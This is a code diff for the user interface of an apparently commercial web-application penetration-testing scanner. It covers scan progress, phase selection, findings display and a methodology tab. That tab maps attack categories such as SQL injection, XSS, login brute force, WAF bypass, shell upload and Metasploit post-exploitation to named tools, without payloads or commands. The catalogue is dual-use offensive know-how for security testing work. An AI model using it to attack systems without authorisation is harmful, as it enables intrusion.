+          const eta = doneCount > 0 ? Math.max(0, Math.floor((elapsed * totalCount / doneCount) - elapsed)) : null;
+          const pct = Math.min(100, Math.round(doneCount / totalCount * 100));
+          const currentPhase = curPhase >= 0 ? PHASES[curPhase] : null;
+          const totalFindings = liveCounts.CRITICAL + liveCounts.HIGH + liveCounts.MEDIUM + liveCounts.LOW;
+          return (
+            <div style={{background:"linear-gradient(180deg,#0a0f1e 0%,#0f172a 100%)",border:"1px solid #1e3a8a",borderRadius:10,padding:"12px 16px",display:"flex",flexDirection:"column",gap:10}}>
+              {/* Row 1: progress + current phase + timing */}
+              <div style={{display:"flex",alignItems:"center",gap:14,flexWrap:"wrap"}}>
+                <div style={{display:"flex",alignItems:"center",gap:8,flex:"1 1 280px",minWidth:240}}>
+                  <span style={{fontSize:11,color:"#64748b",fontWeight:700,letterSpacing:1}}>SCANNING</span>
+                  <span style={{fontSize:13,color:"#e2e8f0",fontWeight:600,fontFamily:"monospace"}}>
+                    {currentPhase ? `${currentPhase.icon||""} ${currentPhase.name}` : "Initializing..."}
+                  </span>
+                </div>
+                <div style={{display:"flex",alignItems:"center",gap:14,fontSize:11,fontFamily:"monospace",color:"#94a3b8"}}>
+                  <span>Phase <b style={{color:"#3b82f6"}}>{doneCount}</b>/<b style={{color:"#e2e8f0"}}>{totalCount}</b></span>
+                  <span>Elapsed <b style={{color:"#22c55e"}}>{fmt(elapsed)}</b></span>
+                  {eta !== null && <span>ETA <b style={{color:"#f59e0b"}}>~{fmt(eta)}</b></span>}
+                </div>
+              </div>
+              {/* Row 2: progress bar */}
+              <div style={{height:6,background:"#0a0f1e",borderRadius:3,overflow:"hidden",border:"1px solid #1e293b"}}>
+                <div style={{height:"100%",width:`${pct}%`,background:"linear-gradient(90deg,#3b82f6 0%,#22c55e 100%)",transition:"width 0.6s ease",borderRadius:3}}/>
+              </div>
+              {/* Row 3: live finding counter */}
+              <div style={{display:"flex",alignItems:"center",gap:8,flexWrap:"wrap"}}>
+                <span style={{fontSize:11,color:"#475569",fontWeight:700,letterSpacing:1}}>FINDINGS SO FAR:</span>
+                {[
+                  {label:"CRITICAL", n:liveCounts.CRITICAL, color:"#f87171", bg:"#1c0000"},
+                  {label:"HIGH",     n:liveCounts.HIGH,     color:"#fb923c", bg:"#1c0a00"},
+                  {label:"MEDIUM",   n:liveCounts.MEDIUM,   color:"#fbbf24", bg:"#1c1500"},
+                  {label:"LOW",      n:liveCounts.LOW,      color:"#4ade80", bg:"#052e16"},
+                ].map(s=>(
+                  <span key={s.label} style={{background:s.bg,border:`1px solid ${s.color}50`,color:s.color,fontSize:11,fontWeight:700,padding:"3px 9px",borderRadius:5,fontFamily:"monospace"}}>
+                    {s.n} {s.label}
+                  </span>
+                ))}
+                {totalFindings === 0 && (
+                  <span style={{fontSize:11,color:"#475569",fontStyle:"italic"}}>No issues found yet — scan in progress...</span>
+                )}
+              </div>
+            </div>
+          );
+        })()}
+
+        {/* Phase selection controls */}
+        {!running && (
+          <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:4,flexWrap:"wrap"}}>
+            <span style={{color:"#64748b",fontSize:12,fontFamily:"monospace"}}>{selectedPhases.size}/{PHASES.length} phases selected</span>
+            <button onClick={()=>setSelectedPhases(new Set(PHASES.map((_,i)=>i)))}
+              style={{background:"#1e293b",border:"1px solid #334155",borderRadius:5,padding:"4px 12px",color:"#22c55e",fontSize:11,fontWeight:700,cursor:"pointer"}}>
+              Select All
+            </button>
+            <button onClick={()=>setSelectedPhases(new Set())}
+              style={{background:"#1e293b",border:"1px solid #334155",borderRadius:5,padding:"4px 12px",color:"#ef4444",fontSize:11,fontWeight:700,cursor:"pointer"}}>
+              Clear All
+            </button>
+            {[
+              {label:"Quick (Recon)",  phases:[0,1,2,3,4,5,6,7,8,9,13]},
+              {label:"Web Attacks",    phases:[10,11,12,14,15,16,17,18,20,21,22]},
+              {label:`Full (All ${PHASES.length})`,  phases:PHASES.map((_,i)=>i)},
+            ].map(preset=>(
+              <button key={preset.label} onClick={()=>setSelectedPhases(new Set(preset.phases))}
+                style={{background:"#1e293b",border:"1px solid #334155",borderRadius:5,padding:"4px 12px",color:"#93c5fd",fontSize:11,fontWeight:600,cursor:"pointer"}}>
+                {preset.label}
+              </button>
+            ))}
+          </div>
+        )}
+        <div style={{border:"1px solid #1e293b",borderRadius:6,overflow:"hidden",background:"#0a0f1c"}}>
+        {PHASES.map((ph,i) => {
+          const isActive   = curPhase === i;
+          const isDone     = done.includes(i);
+          const isSkipped  = skipped.includes(i);
+          const isFailed   = failed.includes(i) && !isSkipped;
+          const res        = allResults[ph.tool];
+          const isSQLi     = ph.tool === "sqlmap" && res && res.vulnerable;
+          const isVuln     = res && res.vulnerable && !isSQLi;
+          const isSelected   = selectedPhases.has(i);
+          const toolLocked   = isTrial && !TRIAL_TOOLS.has(ph.tool) && !isSuperAdmin;
+          const secHdr       = SECTION_HEADERS[ph.tool];
+          const statusCol = isActive?"#3b82f6":isFailed?"#ef4444":isSQLi||isVuln?"#ef4444":isSkipped?"#f59e0b":isDone?"#10b981":"#334155";
+          const statusLabel = isActive?"RUNNING":isFailed?"ERROR":isSQLi||isVuln?"VULNERABLE":isSkipped?"SKIPPED":isDone?"SECURE":toolLocked?"LOCKED":isSelected?"QUEUED":"DISABLED";
+          const _failDetail = (res && (res.skipped_reason || res.error || res.detail)) || "scan failed";
+          const detail = !isDone||!res?"":isFailed?String(_failDetail).substring(0,48):isSkipped?"not applicable":(
+            res.total_findings!==undefined?`${res.total_findings} findings`:
+            res.total_open!==undefined?`${res.total_open} ports`:
+            res.total!==undefined?`${res.total} items`:
+            res.vulnerable!==undefined?(res.vulnerable?"vulnerable":"clean"):"complete"
+          );
+          return (
+            <React.Fragment key={i}>
+            {secHdr && (
+              <div style={{display:"flex",alignItems:"center",gap:10,padding:"14px 16px 6px",borderTop:i===0?"none":"1px solid #1e293b",background:"#0a0f1c"}}>
+                <div style={{width:3,height:18,background:secHdr.color,borderRadius:2,flexShrink:0}}/>
+                <div style={{flex:1}}>
+                  <div style={{fontSize:10,fontWeight:700,color:secHdr.color,letterSpacing:"0.1em",textTransform:"uppercase"}}>{secHdr.label}</div>
+                  <div style={{fontSize:10,color:"#64748b"}}>{secHdr.sub}</div>
+                </div>
+                {isTrial && secHdr.label.includes("Section 1") && <span style={{fontSize:9,color:"#f59e0b",fontWeight:700,background:"rgba(245,158,11,0.1)",padding:"2px 6px",borderRadius:3,letterSpacing:"0.05em"}}>TRIAL</span>}
+                {isTrial && !secHdr.label.includes("Section 1") && <span style={{fontSize:9,color:"#6b7280",fontWeight:700,background:"rgba(107,114,128,0.1)",padding:"2px 6px",borderRadius:3,letterSpacing:"0.05em"}}>PRO</span>}
+              </div>
+            )}
+            <div onClick={()=>{
+                if(running) return;
+                if(toolLocked){ alert("Upgrade to Pro to access this scanner."); return; }
+                setSelectedPhases(p=>{ const n=new Set(p); n.has(i)?n.delete(i):n.add(i); return n; });
+              }}
+              onMouseEnter={e=>{ if(!toolLocked&&!running) e.currentTarget.style.background="#111c33"; }}
+              onMouseLeave={e=>{ e.currentTarget.style.background="transparent"; }}
+              style={{background:"transparent",borderTop:(i===0||secHdr)?"none":"1px solid #1e293b",padding:"10px 16px",display:"flex",alignItems:"center",gap:14,cursor:toolLocked?"not-allowed":running?"default":"pointer",opacity:toolLocked?0.45:isSelected?1:0.5,transition:"background 0.12s,opacity 0.12s"}}>
+              <span style={{width:7,height:7,borderRadius:"50%",background:statusCol,flexShrink:0,boxShadow:isActive?`0 0 8px ${statusCol}`:"none"}}/>
+              {isActive ? (
+                <span style={{display:"inline-block",width:11,height:11,border:"2px solid #3b82f6",borderTopColor:"transparent",borderRadius:"50%",animation:"spin .8s linear infinite",flexShrink:0}}/>
+              ) : (
+                <span style={{fontSize:11,color:isDone?statusCol:"#475569",fontWeight:700,width:11,textAlign:"center",flexShrink:0}}>
+                  {isDone?(isSkipped?"":isFailed?"":isSQLi||isVuln?"!":""):"○"}
+                </span>
+              )}
+              <span style={{fontSize:13,fontWeight:500,color:toolLocked?"#64748b":"#f1f5f9",flex:1,whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis",letterSpacing:"0.01em"}}>{ph.name}</span>
+              <span style={{fontSize:10,fontWeight:600,letterSpacing:"0.08em",color:statusCol,textTransform:"uppercase",minWidth:88,textAlign:"right"}}>{statusLabel}</span>
+              <span style={{fontSize:11,color:"#94a3b8",fontFamily:"ui-monospace,SFMono-Regular,monospace",minWidth:100,textAlign:"right",flexShrink:0}}>{detail}</span>
+              {isDone && res && (
+                <button onClick={e=>{e.stopPropagation(); setExpandedTile(expandedTile===i?null:i);}}
+                  style={{background:expandedTile===i?"#1e3a8a":"transparent",border:"1px solid "+(expandedTile===i?"#3b82f6":"#1e293b"),borderRadius:4,padding:"3px 10px",color:"#94a3b8",fontSize:10,fontWeight:500,cursor:"pointer",flexShrink:0,whiteSpace:"nowrap",letterSpacing:"0.03em"}}>
+                  {expandedTile===i?"Hide":"Details"}
+                </button>
+              )}
+              {!running && target && (
+                <button onClick={e=>{e.stopPropagation();runSingle(ph,i);}}
+                  style={{background:"transparent",border:"1px solid #1e293b",borderRadius:4,padding:"3px 10px",color:"#94a3b8",fontSize:10,fontWeight:500,cursor:"pointer",flexShrink:0,whiteSpace:"nowrap",letterSpacing:"0.03em"}}>
+                  {isDone?"Re-run":"Run"}
+                </button>
+              )}
+            </div>
+            {/* Expansion panel — surfaces real-world error/success details
+                so the customer never has to crack open DevTools or SSH into
+                the VPS to figure out why a scan failed. */}
+            {expandedTile === i && isDone && res && (
+              <div style={{marginTop:-4,marginBottom:8,padding:"14px 18px",background:"#0a1224",border:"1px solid "+(isFailed?"#7f1d1d":isVuln||isSQLi?"#7c2d12":"#14532d"),borderLeft:"3px solid "+(isFailed?"#ef4444":isVuln||isSQLi?"#f97316":"#22c55e"),borderRadius:"0 8px 8px 0",fontSize:12,lineHeight:1.55}}>
+                {/* Header */}
+                <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:10}}>
+                  <span style={{fontSize:14}}>{isFailed?"":isVuln||isSQLi?"":""}</span>
+                  <span style={{fontSize:12,fontWeight:800,letterSpacing:1.2,color:isFailed?"#fca5a5":isVuln||isSQLi?"#fdba74":"#86efac"}}>
+                    {isFailed?"SCAN FAILED — DETAILS":isVuln||isSQLi?"FINDINGS — REVIEW":"SCAN COMPLETE — NO ISSUES"}
+                  </span>
+                </div>
+
+                {/* Error message (from {error: ...} in response) */}
+                {(res.error || res.detail) && (
+                  <div style={{padding:"10px 12px",marginBottom:10,background:"rgba(220,38,38,0.08)",border:"1px solid rgba(220,38,38,0.35)",borderRadius:6,color:"#fecaca"}}>
+                    <div style={{fontSize:10,fontWeight:800,color:"#f87171",letterSpacing:1.5,marginBottom:4}}>ERROR</div>
+                    <div style={{wordBreak:"break-word"}}>{res.error || res.detail}</div>
+                  </div>
+                )}
+
+                {/* Suggested action — the friendly "what to try" hint */}
+                {res.suggested_action && (
+                  <div style={{padding:"10px 12px",marginBottom:10,background:"rgba(251,191,36,0.10)",border:"1px solid rgba(251,191,36,0.35)",borderRadius:6,color:"#fde68a"}}>
+                    <span style={{fontSize:11,fontWeight:800,color:"#fbbf24",marginRight:6}}>What to try:</span>
+                    {res.suggested_action}
+                  </div>
+                )}
+
+                {/* Findings list (when scan succeeded and found issues) */}
+                {Array.isArray(res.findings) && res.findings.length > 0 && (
+                  <div style={{marginBottom:10}}>
+                    <div style={{fontSize:10,fontWeight:800,color:"#94a3b8",letterSpacing:1.5,marginBottom:6}}>
+                      FINDINGS ({res.findings.length})
+                    </div>
+                    <div style={{maxHeight:280,overflowY:"auto",display:"flex",flexDirection:"column",gap:6}}>
+                      {res.findings.slice(0,50).map((f,fi)=>{
+                        const sev = String(f.severity||"INFO").toUpperCase();
+                        const sevColor = sev==="CRITICAL"?"#dc2626":sev==="HIGH"?"#f97316":sev==="MEDIUM"?"#eab308":sev==="LOW"?"#22c55e":"#94a3b8";
+                        return (
+                          <div key={fi} style={{padding:"8px 10px",background:"#020617",border:"1px solid #1e293b",borderRadius:5,borderLeft:`3px solid ${sevColor}`}}>
+                            <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:3}}>
+                              <span style={{fontSize:9,fontWeight:800,color:sevColor,background:sevColor+"22",padding:"1px 6px",borderRadius:3,letterSpacing:1}}>{sev}</span>
+                              {f.cvss && <span style={{fontSize:9,color:"#94a3b8"}}>CVSS {f.cvss}</span>}
+                              {f.cve && f.cve !== "N/A" && <span style={{fontSize:9,color:"#60a5fa",fontFamily:"monospace"}}>{f.cve}</span>}
+                            </div>
+                            <div style={{fontSize:11,color:"#cbd5e1"}}>{f.detail}</div>
+                            {f.remediation && (
+                              <div style={{fontSize:10,color:"#86efac",marginTop:4,fontStyle:"italic"}}>
+                                Fix: {f.remediation}
+                              </div>
+                            )}
+                          </div>
+                        );
+                      })}
+                      {res.findings.length > 50 && (
+                        <div style={{fontSize:10,color:"#64748b",textAlign:"center",padding:6,fontStyle:"italic"}}>
+                          ... and {res.findings.length - 50} more findings (download full PDF report)
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                )}
+
+                {/* Plain-success — no error, no findings, no vuln flag */}
+                {!res.error && !res.detail && (!res.findings || res.findings.length === 0) && !res.vulnerable && (
+                  <div style={{padding:"10px 12px",background:"rgba(34,197,94,0.08)",border:"1px solid rgba(34,197,94,0.30)",borderRadius:6,color:"#bbf7d0"}}>
+                    Scan completed cleanly — no issues detected for this target.
+                  </div>
+                )}
+
+                {/* Raw output snippet for debugging — collapsed by default
+                    via <details>. The customer doesn't need it, but it's
+                    there if they want to see what the scanner printed. */}
+                {res.raw_output && (
+                  <details style={{marginTop:8}}>
+                    <summary style={{fontSize:10,color:"#64748b",cursor:"pointer",userSelect:"none"}}>
+                      Show raw output ({String(res.raw_output).length} chars)
+                    </summary>
+                    <pre style={{marginTop:6,padding:"8px 10px",background:"#020617",border:"1px solid #1e293b",borderRadius:5,color:"#94a3b8",fontSize:10,maxHeight:200,overflow:"auto",whiteSpace:"pre-wrap",wordBreak:"break-all"}}>
+                      {String(res.raw_output).substring(0,3000)}
+                    </pre>
+                  </details>
+                )}
+              </div>
+            )}
+            </React.Fragment>
+          );
+        })}
+        </div>
+
+        {/* WAPT-TERMINAL-POSITION-V2 — Live terminal now sits AFTER the tools
+            end (was above the tabs before). Keeps the scan log close to the
+            tools that produced it. INSIDE the outer phases-tab container so
+            the ternary remains a single expression. */}
+        <div style={{marginTop:18}}>
+          <div style={{fontSize:11,color:"#64748b",fontWeight:700,letterSpacing:1,marginBottom:6,textTransform:"uppercase"}}>
+            Live Scan Terminal
+          </div>
+          <Terminal lines={lines} height={160}/>
+        </div>
+      </div>
+      )}
+
+      {/* FINDINGS TAB — VL-FORGE Web App Pentesting findings synthesis (all 32 tools) */}
+      {tab==="findings" && finished && (() => {
+        const allF = synthesizeWebappFindings(allResults);
+        const coverage = computeWebappCoverage(allResults);
+        const toolsRan = coverage.reduce((acc,t) => acc + t.ran, 0);
+        const toolsFlagged = coverage.reduce((acc,t) => acc + t.flagged, 0);
+        return (
+          <div>
+            {/* Severity rollup */}
+            <div style={{display:"flex",gap:8,marginBottom:12,flexWrap:"wrap"}}>
+              {["CRITICAL","HIGH","MEDIUM","LOW"].map(s=>{
+                const cnt=allF.filter(f=>f.severity===s).length;
+                const c={CRITICAL:"#dc2626",HIGH:"#ea580c",MEDIUM:"#ca8a04",LOW:"#16a34a"}[s];
+                return <div key={s} style={{background:c+"15",border:`1px solid ${c}`,borderRadius:6,padding:"8px 16px",textAlign:"center",minWidth:70}}>
+                  <div style={{fontSize:22,fontWeight:700,color:c}}>{cnt}</div>
+                  <div style={{fontSize:9,color:c,fontWeight:600}}>{s}</div>
+                </div>;
+              })}
+              <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:6,padding:"8px 16px",textAlign:"center",minWidth:70}}>
+                <div style={{fontSize:22,fontWeight:700,color:"#64748b"}}>{allF.length}</div>
+                <div style={{fontSize:9,color:"#64748b",fontWeight:600}}>TOTAL</div>
+              </div>
+              <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:6,padding:"8px 16px",textAlign:"center",minWidth:90}}>
+                <div style={{fontSize:22,fontWeight:700,color:"#3b82f6"}}>{toolsRan}/{WEBAPP_TOOL_KEYS.length}</div>
+                <div style={{fontSize:9,color:"#3b82f6",fontWeight:600}}>TOOLS RAN</div>
+              </div>
+              <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:6,padding:"8px 16px",textAlign:"center",minWidth:90}}>
+                <div style={{fontSize:22,fontWeight:700,color:"#a855f7"}}>{toolsFlagged}</div>
+                <div style={{fontSize:9,color:"#a855f7",fontWeight:600}}>TOOLS FLAGGED</div>
+              </div>
+            </div>
+
+            {/* Per-tier coverage strip */}
+            <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(120px,1fr))",gap:6,marginBottom:14}}>
+              {coverage.map(t => {
+                const color = t.flagged > 0 ? "#dc2626" : (t.ran === t.total ? "#22c55e" : "#64748b");
+                return (
+                  <div key={t.id} style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:6,padding:"8px 10px",borderLeft:`3px solid ${color}`}}>
+                    <div style={{fontSize:10,color:"#94a3b8",fontWeight:600,marginBottom:2}}>{t.label}</div>
+                    <div style={{fontSize:11,color:color,fontWeight:700}}>{t.ran}/{t.total} ran · {t.flagged} flagged</div>
+                  </div>
+                );
+              })}
+            </div>
+
+            <div style={{display:"flex",flexDirection:"column",gap:6}}>
+              {allF.length===0 && <div style={{textAlign:"center",padding:40,color:"#334155"}}>No findings — clean scan or no tools ran yet.</div>}
+              {allF.map((f,i)=>{
+                const c={CRITICAL:"#dc2626",HIGH:"#ea580c",MEDIUM:"#ca8a04",LOW:"#16a34a",INFO:"#64748b"}[f.severity]||"#64748b";
+                return (
+                  <div key={i} style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:"14px 16px",borderLeft:`3px solid ${c}`}}>
+                    <div style={{display:"flex",gap:8,marginBottom:6,flexWrap:"wrap",alignItems:"center"}}>
+                      <span style={{background:c+"20",color:c,fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>{f.severity}</span>
+                      {f.cve&&f.cve!=="N/A"&&<span style={{background:"#fef2f2",color:"#dc2626",fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>CVE: {f.cve}</span>}
+                      {f.cwe&&f.cwe!=="N/A"&&<span style={{background:"#f5f3ff",color:"#7c3aed",fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>{f.cwe}</span>}
+                      <span style={{fontSize:9,color:"#64748b"}}>CVSS: {f.cvss||"N/A"}</span>
+                      {f.owasp&&f.owasp!=="N/A"&&<span style={{fontSize:9,color:"#475569",background:"#020617",padding:"2px 6px",borderRadius:3,border:"1px solid #1e293b"}}>{f.owasp}</span>}
+                      <span style={{marginLeft:"auto",fontSize:9,color:"#3b82f6",fontFamily:"monospace"}}>via {f.source}</span>
+                    </div>
+                    <div style={{fontSize:12,color:"#e2e8f0",marginBottom:8}}>{f.detail}</div>
+                    {f.evidence && <div style={{background:"#020617",border:"1px solid #1e293b",borderRadius:4,padding:"4px 8px",fontSize:10,color:"#94a3b8",fontFamily:"monospace",marginBottom:6}}><strong style={{color:"#cbd5e1"}}>Evidence:</strong> {f.evidence}</div>}
+                    {f.remediation && <div style={{background:"#052e16",border:"1px solid #166534",borderRadius:4,padding:"6px 10px",fontSize:11,color:"#4ade80"}}>
+                      <strong>Fix:</strong> {f.remediation}
+                    </div>}
+                  </div>
+                );
+              })}
+            </div>
+          </div>
+        );
+      })()}
+      {tab==="findings" && !finished && <div style={{textAlign:"center",padding:60,color:"#334155",fontSize:13}}>Run a pentest first to see findings here.</div>}
+
+      {/* METHODOLOGY TAB */}
+      {tab==="methodology" && (
+        <div style={{display:"flex",flexDirection:"column",gap:8}}>
+          <div style={{background:"#0c1a3d",border:"1px solid #1e3a8a",borderRadius:8,padding:"12px 16px",marginBottom:4}}>
+            <div style={{fontSize:13,fontWeight:700,color:"#93c5fd",marginBottom:4}}>WAPT Methodology — 15 Categories</div>
+            <div style={{fontSize:11,color:"#475569"}}>= Tool available in your platform | = Partially covered | = Manual/external tool needed</div>
+          </div>
+          {[
+            {num:"01",cat:"Web Fundamentals",icon:"",color:"#3b82f6",tools:[
+              {name:"HTTP/HTTPS Headers Analysis",tool:"curl",status:"",desc:"Security headers check — Phase 6"},
+              {name:"TLS/SSL Misconfigurations",tool:"sslscan",status:"",desc:"SSL/TLS scan — Phase 5"},
+              {name:"CORS Bypass Testing",tool:"curl",status:"",desc:"CORS test — Phase 8"},
+              {name:"Cookie & Session Analysis",tool:"curl",status:"",desc:"Cookie flags check — Phase 7"},
+              {name:"JWT Token Analysis",tool:"manual",status:"",desc:"Use jwt.io or Burp Suite manually"},
+            ]},
+            {num:"02",cat:"Recon & Enumeration",icon:"",color:"#22c55e",tools:[
+              {name:"Subdomain Enumeration",tool:"sublist3r",status:"",desc:"Subdomain discovery — Phase 10"},
+              {name:"Directory Brute-Force",tool:"gobuster",status:"",desc:"Dir enumeration — Phase 9"},
+              {name:"Technology Fingerprinting",tool:"whatweb",status:"",desc:"Tech stack — Phase 2"},
+              {name:"DNS Enumeration",tool:"dig/dnsrecon",status:"",desc:"DNS records — Phase 14"},
+              {name:"Virtual Host Discovery",tool:"ffuf",status:"",desc:"ffuf vhost fuzzing — available"},
+              {name:"Parameter Discovery",tool:"arjun",status:"",desc:"arjun parameter discovery — available"},
+            ]},
+            {num:"03",cat:"Tools Mastery",icon:"",color:"#f59e0b",tools:[
+              {name:"WAF Detection",tool:"wafw00f",status:"",desc:"WAF check — Phase 1"},
+              {name:"CMS Detection",tool:"whatweb",status:"",desc:"CMS scan — Phase 3"},
+              {name:"Nuclei Templates",tool:"nuclei",status:"",desc:"nuclei 3.8.0 — template-based scanning"},
+              {name:"Custom Python Scripts",tool:"python",status:"",desc:"Use Kali terminal for custom scripts"},
+            ]},
+            {num:"04",cat:"Injection Attacks",icon:"",color:"#dc2626",tools:[
+              {name:"SQL Injection (Error-based)",tool:"sqlmap",status:"",desc:"SQLMap auto — Phase 13"},
+              {name:"Blind SQL Injection",tool:"sqlmap",status:"",desc:"SQLMap --level=2 flag enabled"},
+              {name:"Time-based SQLi",tool:"sqlmap",status:"",desc:"SQLMap handles time-based automatically"},
+              {name:"XSS (Reflected/Stored)",tool:"xsser",status:"",desc:"XSS test — Phase 11"},
+              {name:"Command Injection",tool:"manual",status:"",desc:"Test manually via Burp Repeater"},
+              {name:"SSTI (Template Injection)",tool:"manual",status:"",desc:"Use tplmap: pip install tplmap"},
+              {name:"NoSQL Injection",tool:"manual",status:"",desc:"Manual testing with Burp Suite"},
+            ]},
+            {num:"05",cat:"XSS & Client-Side",icon:"",color:"#a855f7",tools:[
+              {name:"Reflected XSS",tool:"xsser",status:"",desc:"XSS automated test — Phase 11"},
+              {name:"DOM XSS",tool:"manual",status:"",desc:"Manual browser testing required"},
+              {name:"CSP Analysis",tool:"curl",status:"",desc:"Checked in headers scan — Phase 6"},
+              {name:"Clickjacking",tool:"curl",status:"",desc:"X-Frame-Options checked — Phase 6"},
+              {name:"XSS Filter Evasion",tool:"xsser",status:"",desc:"xsser has built-in evasion payloads"},
+            ]},
+            {num:"06",cat:"Auth & Authorization",icon:"",color:"#f97316",tools:[
+              {name:"Brute Force Login",tool:"hydra",status:"",desc:"Hydra — Password Attacks module"},
+              {name:"Cookie Security",tool:"curl",status:"",desc:"HttpOnly/Secure flags — Phase 7"},
+              {name:"Session Analysis",tool:"curl",status:"",desc:"Basic session check in cookies scan"},
+              {name:"IDOR Testing",tool:"manual",status:"",desc:"Manual testing with Burp Repeater"},
+              {name:"MFA Bypass",tool:"manual",status:"",desc:"Manual testing required"},
+              {name:"Privilege Escalation",tool:"manual",status:"",desc:"Manual logic testing"},
+            ]},
+            {num:"07",cat:"API Security",icon:"",color:"#06b6d4",tools:[
+              {name:"API Endpoint Discovery",tool:"gobuster",status:"",desc:"gobuster finds API endpoints — Phase 9"},
+              {name:"REST API Testing",tool:"curl",status:"",desc:"Basic curl tests in headers scan"},
+              {name:"GraphQL Attacks",tool:"manual",status:"",desc:"Use GraphQL Voyager + Burp Suite"},
+              {name:"BOLA/IDOR",tool:"manual",status:"",desc:"Manual testing required"},
+              {name:"Rate Limit Bypass",tool:"manual",status:"",desc:"Test with Burp Intruder"},
+              {name:"API Fuzzing",tool:"ffuf",status:"",desc:"Install ffuf for API fuzzing"},
+            ]},
+            {num:"08",cat:"File & Resource Attacks",icon:"",color:"#84cc16",tools:[
+              {name:"File Upload Testing",tool:"manual",status:"",desc:"Upload shell via Burp Suite"},
+              {name:"Path Traversal (LFI/RFI)",tool:"nikto",status:"",desc:"nikto checks basic LFI — Phase 12"},
+              {name:"Directory Listing",tool:"gobuster+nikto",status:"",desc:"Both tools check this automatically"},
+              {name:"Backup File Leakage",tool:"gobuster",status:"",desc:"gobuster finds .bak .zip .conf files"},
+              {name:"Deserialization",tool:"manual",status:"",desc:"Use ysoserial manually"},
+            ]},
+            {num:"09",cat:"Business Logic",icon:"",color:"#ec4899",tools:[
+              {name:"Workflow Bypass",tool:"manual",status:"",desc:"Manual testing — think like attacker"},
+              {name:"Payment Manipulation",tool:"manual",status:"",desc:"Intercept with Burp Suite proxy"},
+              {name:"Race Conditions",tool:"manual",status:"",desc:"Use Burp Turbo Intruder"},
+              {name:"Logic Flaws",tool:"manual",status:"",desc:"Requires deep manual analysis"},
+              {name:"Parameter Tampering",tool:"manual",status:"",desc:"Modify hidden params in Burp Repeater"},
+            ]},
+            {num:"10",cat:"Modern Web Attacks",icon:"",color:"#0ea5e9",tools:[
+              {name:"SSRF Testing",tool:"curl",status:"",desc:"Basic SSRF via curl payload test"},
+              {name:"XXE (XML External Entity)",tool:"manual",status:"",desc:"Manual XML payload injection"},
+              {name:"CSRF Testing",tool:"curl",status:"",desc:"CORS/SameSite checked in Phase 8"},
+              {name:"WebSocket Security",tool:"manual",status:"",desc:"Use Burp Suite WebSocket feature"},
+            ]},
+            {num:"11",cat:"CMS Pentesting",icon:"",color:"#8b5cf6",tools:[
+              {name:"CMS Detection",tool:"whatweb",status:"",desc:"CMS auto-detected — Phase 3"},
+              {name:"WordPress Scanning",tool:"wpscan",status:"",desc:"wpscan 3.8.28 — auto WordPress audit"},
+              {name:"Plugin Vulnerabilities",tool:"wpscan",status:"",desc:"wpscan checks plugin CVEs automatically"},
+              {name:"Framework Detection",tool:"whatweb",status:"",desc:"whatweb detects Laravel/Django/etc"},
+            ]},
+            {num:"12",cat:"Fuzzing & Automation",icon:"",color:"#f43f5e",tools:[
+              {name:"Directory Fuzzing",tool:"gobuster",status:"",desc:"gobuster with common wordlist — Phase 9"},
+              {name:"Parameter Fuzzing",tool:"ffuf/arjun",status:"",desc:"ffuf + arjun — both installed"},
+              {name:"Subdomain Fuzzing",tool:"sublist3r",status:"",desc:"sublist3r — Phase 10"},
+              {name:"Payload Fuzzing",tool:"wfuzz",status:"",desc:"wfuzz available in Recon module"},
+            ]},
+            {num:"13",cat:"WAF Evasion & Bypass",icon:"",color:"#f97316",tools:[
+              {name:"WAF Detection",tool:"wafw00f",status:"",desc:"wafw00f — Phase 1"},
+              {name:"Encoding Tricks",tool:"sqlmap",status:"",desc:"sqlmap handles encoding automatically"},
+              {name:"WAF Bypass Payloads",tool:"sqlmap",status:"",desc:"sqlmap --tamper scripts available"},
+              {name:"IP Spoofing Headers",tool:"curl",status:"",desc:"Manual X-Forwarded-For header test"},
+            ]},
+            {num:"14",cat:"Reporting & Methodology",icon:"",color:"#22c55e",tools:[
+              {name:"PDF Report Generation",tool:"built-in",status:"",desc:"One-click PDF with CVSS/CWE/OWASP"},
+              {name:"CSV Export",tool:"built-in",status:"",desc:"Export findings to spreadsheet"},
+              {name:"Risk Score (0-100)",tool:"built-in",status:"",desc:"Auto-calculated risk score"},
+              {name:"CVSS Scoring",tool:"built-in",status:"",desc:"CVSS assigned to each finding"},
+              {name:"OWASP Mapping",tool:"built-in",status:"",desc:"Each finding mapped to OWASP Top 10"},
+              {name:"CVE References",tool:"built-in",status:"",desc:"CVE IDs extracted from nikto output"},
+            ]},
+            {num:"15",cat:"Real-World Exploitation",icon:"",color:"#dc2626",tools:[
+              {name:"Full DVWA Pentest",tool:"all-phases",status:"",desc:"Target: any web application"},
+              {name:"SQL Injection on DVWA",tool:"sqlmap",status:"",desc:"Auto-tests SQLi on target"},
+              {name:"XSS on DVWA",tool:"xsser",status:"",desc:"Auto-tests XSS on target"},
+              {name:"Chain Vulnerabilities",tool:"manual+platform",status:"",desc:"Use findings to chain attacks manually"},
+              {name:"Post-Exploitation",tool:"manual",status:"",desc:"Use Metasploit Framework module"},
+            ]},
+          ].map((cat,ci)=>(
+            <div key={ci} style={{background:"#0f172a",border:`1px solid ${cat.color}30`,borderRadius:8,overflow:"hidden"}}>
+              <div style={{background:cat.color+"15",padding:"10px 16px",borderBottom:`1px solid ${cat.color}30`,display:"flex",alignItems:"center",gap:10}}>
+                <span style={{fontSize:16}}>{cat.icon}</span>
+                <span style={{fontSize:11,fontWeight:700,color:cat.color,letterSpacing:1}}>{cat.num}</span>
+                <span style={{fontSize:13,fontWeight:700,color:"#f1f5f9"}}>{cat.cat}</span>
+                <div style={{marginLeft:"auto",display:"flex",gap:4}}>
+                  <span style={{fontSize:9,background:"#052e1650",color:"#22c55e",padding:"2px 6px",borderRadius:3}}>
+                    {cat.tools.filter(t=>t.status==="").length}
+                  </span>
